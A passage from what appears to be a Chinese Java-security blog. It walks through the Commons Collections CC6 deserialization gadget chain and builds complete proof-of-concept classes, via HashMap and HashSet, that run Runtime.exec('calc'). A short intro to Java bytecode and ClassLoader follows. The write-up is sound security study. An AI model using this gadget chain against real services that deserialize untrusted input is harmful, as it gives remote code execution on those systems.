<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public Object getValue() &#123;</span><br><span class="line">    return map.get(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>而且map是可控的</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public TiedMapEntry(Map map, Object key) &#123;</span><br><span class="line">    super();</span><br><span class="line">    this.map = map;</span><br><span class="line">    this.key = key;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="hashmap（方法一）"><a href="#hashmap（方法一）" class="headerlink" title="hashmap（方法一）"></a>hashmap（方法一）</h3><p>然后我们可以在hashcode中找到对getvalue的调用</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public int hashCode() &#123;</span><br><span class="line">    Object value = getValue();</span><br><span class="line">    return (getKey() == null ? 0 : getKey().hashCode()) ^</span><br><span class="line">           (value == null ? 0 : value.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>那我们可以继续构造我们的POC:</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class cc6 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;new String(&quot;calc&quot;)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line">         HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;ceshi&quot;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>这里我们通过hashcode可以触发getvalue进行触发get方法</p>
<p>那么我们后面就是继续找哪里调用了hashcode</p>
<p>关于hashcode我们在urldns中是通过hashmap反序列化时候其<code>readObject()</code>函数会循环每一个键值对放入到HashMap中，而在放入每一个键值对的时候会计算hash（key）值，从而触发<code>key.hashCode()</code>方法，我们在cc6同样可以继续使用这个利用链,进而触发我们后面的漏洞方法：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">          <span class="comment">///******中间代码省略</span></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到在反序列化时会遍历每一个键值对，将其放入到hashmap中，但是这个过程每次都会调用到hash(key)方法，我们跟进到hash方法：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726151141806.png"
                      alt="image-20230726151141806"
                ></p>
<p>hash方法会对传进来的key值进行判断是否为空，我们只许让key值不为空我们就能触发到hashcode方法</p>
<p>然后我们这里可以看到触发hashcode的时key值</p>
<p>那么我们只需要让传进来的key值为我们前面构造的TiedMapEntry对象就可以触发到TiedMapEntry类里面的hashcode方法，那我们整条链子就可以连起来了。</p>
<p>那么根据我们上面的分析我们可以构造出来我们的利用链POC：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;calc&quot;</span>)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;ccz&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;cc&quot;</span>);</span><br><span class="line">        &#125;    </span><br></pre></td></tr></table></figure></div>

<p>但是现在出现了一个问题，我们现在这里并没有进行反序列化但是这条链子就已经会弹出来计算器了。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726152001706.png"
                      alt="image-20230726152001706"
                ></p>
<p>出现的这个问题的原因和我们在分析urldns时触发了两次dns解析的原因是一样的：</p>
<p>我们在使用hash.put输入键值对时就会触发一次hash方法，我们这里可以跟进put方法看一下：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726152332245.png"
                      alt="image-20230726152332245"
                ></p>
<p>在我们调用put方法的时候也会调用hash方法进而触发了我们后面的利用链：</p>
<p>当然解决这个问题的方法也很简单：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, chainedTransformer);</span><br></pre></td></tr></table></figure></div>

<p>我们只用将这里的我们构造的chainTransformer对象先替换掉，让利用链到Lazymap的get方法时先断开，避免在使用put方法时触发利用链。</p>
<p>修改POC：</p>
<div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc6</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;calc&quot;</span>)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>));</span><br><span class="line">        <span class="type">TiedMapEntry</span> <span class="variable">tiedMapEntry</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TiedMapEntry</span>(lazyMap, <span class="string">&quot;ccz&quot;</span>);</span><br><span class="line">        Map&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,<span class="string">&quot;cc&quot;</span>);</span><br><span class="line">        &#125;    </span><br></pre></td></tr></table></figure></div>

<p>我们这里使用的还是这个ConstantTransformer方法，这个方法我们在cc1解决setvlaue值不可控的时候用过，我们通过这个方法使得无论接收什么，都会将我们构造的虚拟机对象返回。</p>
<p>我们这里同样使用这个方法，当然这个地方其他方法也可以，我们最终的目的只是让利用链断开，无法执行到我们后面的transform方法。</p>
<p>但是我们后期还是要执行这个利用链，所以我们后面在执行完hashmap.put之后要将我们构造的chainTransformer对象重新传进去，使整个利用链能够到transform方法执行命令。</p>
<p>我们这里可以通过反射机制通过获取和设置类的私有字段来修改<code>LazyMap</code>对象的<code>factory</code>字段，为我们构造的chainTransformer对象即可。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Class c = LazyMap.class;</span><br><span class="line">Field factory = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">factory.setAccessible(true);</span><br><span class="line">factory.set(lazyMap,chainedTransformer);</span><br></pre></td></tr></table></figure></div>

<p>那么整体的POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class cc6 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;new String(&quot;calc&quot;)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;ccz&quot;);</span><br><span class="line">        Map&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;cc&quot;);</span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factory = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">       unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">   &#125;</span><br><span class="line">    public static void unserialize(String Filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">       ois.readObject();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但是我们这里运行之后发现并没有执行我们调用计算器程序的命令。</p>
<p>我们在<code>hashMap.put(tiedMapEntry,&quot;cc&quot;);</code>打上断点进行调试：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726154314171.png"
                      alt="image-20230726154314171"
                ></p>
<p>步入，跟进：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726154503873.png"
                      alt="image-20230726154503873"
                ></p>
<p>当我们跟进到LazyMap的get方法时可以看到这里：</p>
<p>这里的containsKey(key)会检测key是否存在map中，这里的map也就是我们上面定义的hashmap对象map</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br></pre></td></tr></table></figure></div>

<p>然后这里我们上面是没有往里面放任何数据的所以这里会返回false</p>
<p>进而触发了第一次</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">factory.transform(key);</span><br></pre></td></tr></table></figure></div>

<p>但是这里的<code>map.put(key, value);</code>会将key值添加到map中</p>
<p>那么现在就出现一个个问题在我们进行反序列化时利用链走到这个if判断时，由于map中存在这个key值，导致<code>map.containsKey(key)</code>返回值为true，导致无法触发到<code>factory.transform(key);</code>方法，进而无法执行到后面的利用链进行命令执行。</p>
<p>这也就是我们刚才反序列化为什么不能够执行调用计算器程序命令的原因，我们的利用链走到这个get方法就断掉了，导致后续利用无法进行。</p>
<p>那么解决这个问题的方法也很简单，既然存在了这个key值，导致<code>map.containsKey(key)</code>返回值为true，那我们这里把这个key值删掉就行了，使其返回值为false进行触发到<code>factory.transform(key);</code></p>
<p>我们这里直接使用remove就可以删除了。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">lazyMap.remove(&quot;ceshi&quot;);</span><br></pre></td></tr></table></figure></div>

<h3 id="最终POC"><a href="#最终POC" class="headerlink" title="最终POC"></a>最终POC</h3><p>那么根据我们上面的分析我们可以构造出最终的POC：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class cc6 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;new String(&quot;calc&quot;)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;ceshi&quot;);</span><br><span class="line">        Map&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;();</span><br><span class="line">        hashMap.put(tiedMapEntry,&quot;cc&quot;);</span><br><span class="line">        lazyMap.remove(&quot;ceshi&quot;);</span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factory = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(hashMap);</span><br><span class="line">       unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">   &#125;</span><br><span class="line">    public static void unserialize(String Filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">       ois.readObject();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>运行看一下结果：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726162609492.png"
                      alt="image-20230726162609492"
                ></p>
<p>触发成功。</p>
<h3 id="hashSet（方法二）"><a href="#hashSet（方法二）" class="headerlink" title="hashSet（方法二）"></a>hashSet（方法二）</h3><p>在上面我们我们分析了，hashmap的put方法在调用时也会调用hashcode方法进而调用后续执行链，我们在前面是通过修改传入的chainTransform对象，使执行链断开，使在调用put方法时无法执行后续执行链。</p>
<p>那我们是否可以利用这个put方法，将其纳入到利用链里面。</p>
<p>我们这里可以找一下put方法的调用：</p>
<p>我们发现<code>HashSet.readObject()</code>中call 到了put()方法</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">    private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">        throws java.io.IOException, ClassNotFoundException &#123;</span><br><span class="line">////*/**********中间代码省略</span><br><span class="line"></span><br><span class="line">        // Read in all elements in the proper order.</span><br><span class="line">        for (int i=0; i&lt;size; i++) &#123;</span><br><span class="line">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                E e = (E) s.readObject();</span><br><span class="line">            map.put(e, PRESENT);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<p>我们只需要让或者map的值是我们的hashmap对象就行了，我们就可以通过这个hashSet调用后续执行链。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726165235137.png"
                      alt="image-20230726165235137"
                ></p>
<p>可以看到这个readObject中会自动创建一个map，然后这里会判断始HashSet对象是不是LinkedHashSet的实例，是的话会创建一个一个新的<code>LinkedHashMap</code>对象，不是的话就会创造一个hashmap对象。</p>
<p>那我们只用改变生成的hashmap对象的key值为我们要传入的TiedMapEntry对象，后面再调用map.put的时候就可以触发后续执行链。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">map.put(e, PRESENT);</span><br></pre></td></tr></table></figure></div>

<p>所以我们就是要让这里的e变成我们创建的TiedMapEntry对象。</p>
<p>那我们这里可以看一下<code>HashSet.writeObject</code>：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726165940060.png"
                      alt="image-20230726165940060"
                ></p>
<p>这里的e就是map中的key值，复制给e然后进行序列化，那么也就是说如果我们变量map中存在值，这里就会将其序列化，那么我们只要将我们构造的TiedMapEntry对象传入到这个map中，再反序列化调用put时就可以触发后续利用链。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726170902125.png"
                      alt="image-20230726170902125"
                ></p>
<p>再hashSet方法中会向map中添加一个key</p>
<p>那我们这里直接通过add方法将我们的TiedMapEntry对象传入进去，进而触发后续利用链。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashSet hashSet=new HashSet();</span><br><span class="line">hashSet.add(tiedMapEntry);</span><br></pre></td></tr></table></figure></div>

<h3 id="最终POC："><a href="#最终POC：" class="headerlink" title="最终POC："></a>最终POC：</h3><p>那么根据上面的分析我们的poc就可以修改为：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class cc6 &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        Transformer[] transformers = new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(Runtime.class),</span><br><span class="line">                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),</span><br><span class="line">                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;new String(&quot;calc&quot;)&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map, new ConstantTransformer(1));</span><br><span class="line">        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, &quot;ceshi&quot;);</span><br><span class="line">        HashSet hashSet=new HashSet();</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line">        lazyMap.remove(&quot;test1&quot;);</span><br><span class="line">        lazyMap.remove(&quot;ceshi&quot;);</span><br><span class="line">        Class c = LazyMap.class;</span><br><span class="line">        Field factory = c.getDeclaredField(&quot;factory&quot;);</span><br><span class="line">        factory.setAccessible(true);</span><br><span class="line">        factory.set(lazyMap,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(hashSet);</span><br><span class="line">       unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj) throws Exception &#123;</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">   &#125;</span><br><span class="line">    public static void unserialize(String Filename) throws Exception &#123;</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">       ois.readObject();</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>运行测试：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726171407225.png"
                      alt="image-20230726171407225"
                ></p>
<p>触发成功。</p>
<p>利用链：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">HashSet.readObject</span><br><span class="line">HashMap.put</span><br><span class="line">HashMap.hash</span><br><span class="line">TiedMapEntry.hashCode</span><br><span class="line">TiedMapEntry.getValue</span><br><span class="line">LazyMap.get</span><br><span class="line">ChainedTransformer.transform</span><br><span class="line">InvokerTransformer.transform</span><br><span class="line">Runtime.exec</span><br></pre></td></tr></table></figure></div>



<h1 id="三、总结"><a href="#三、总结" class="headerlink" title="三、总结"></a>三、总结</h1><p>cc6利用链流程图</p>
<p><strong><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726172720852.png"
                      alt="image-20230726172720852"
                ></strong></p>
<p>结合urldns和cc1的一个整体流程图：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230726173711097.png"
                      alt="image-20230726173711097"
                ></p>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title>java动态加载字节码</title>
    <url>/2023/07/31/java%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81/</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>在前面分析CC1和CC6利用链的时候，都是通过transform之间之间执行命令，但是在cc3中是通过动态类加载来实现自动执行恶意类的代码。然后这里在对cc3利用链分析前，先对java动态加载字节码进行一个学习。</p>
<h1 id="二、java字节码"><a href="#二、java字节码" class="headerlink" title="二、java字节码"></a>二、java字节码</h1><p>java字节码是java程序源代码经过编译器(javac)编译生成的中间代码，严格来说，它并不是本地机器代码，而是一种与平台无关的低级指令集。这些指令由java虚拟机（JVM）解释执行，使得java程序可以一次编写，随处执行。使得上层开发者只需将自己的代码编译一次，就可以运行在不同平台的JVM虚拟机中。</p>
<p>我们写的java(.java)程序通过编译器编译成的就是字节码文件(.class)。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">public class helloworld &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        System.out.println(&quot;hello,world&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>通过编译器进行编译：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">javac 文件名.java</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731140856122.png"
                      alt="image-20230731140856122"
                ></p>
<p>我们这里通过010打开编译器生成的class文件就可以看到生成的字节码了。</p>
<p>可以看到在我们生成的字节码中包含了常量，访问标志，类信息，字段信息，方法信息，方法代码，以及字节码指令等等这些内容共同构成了java字节码结构，java虚拟机在运行时通过解释这些字节码指令来执行java程序。</p>
<p>具体的关于字节码的每一块的解释可以看看这篇文章:</p>
<p><a class="link"   href="https://www.jianshu.com/p/fa53b4169df9" >https://www.jianshu.com/p/fa53b4169df9 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>下图引自P神java安全漫谈</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230731142609856.png"
                      alt="image-20230731142609856"
                ></p>
<h1 id="三、ClassLoader（类加载器）"><a href="#三、ClassLoader（类加载器）" class="headerlink" title="三、ClassLoader（类加载器）"></a>三、ClassLoader（类加载器）</h1><p>在上面我们说可以java虚拟机通过解释字节码来执行java程序</p>
<p>但是我们想要通过解释器去解释字节码执行java程序要先将字节码加载到内存中,那么在java虚拟机中将字节码加载到内存中就是通过类加载器。这个JVM的重要组件来实现的。当classloader将字节码加载到内存中，会创建相应的Class对象，然后解释器逐条解释执行这些字节码指令，然后执行对应的操作，并根据指令的结果继续执行下一条指令。解释器的作用是将字节码翻译成实际的操作，实现了 Java 代码在不同平台上的执行。</p>
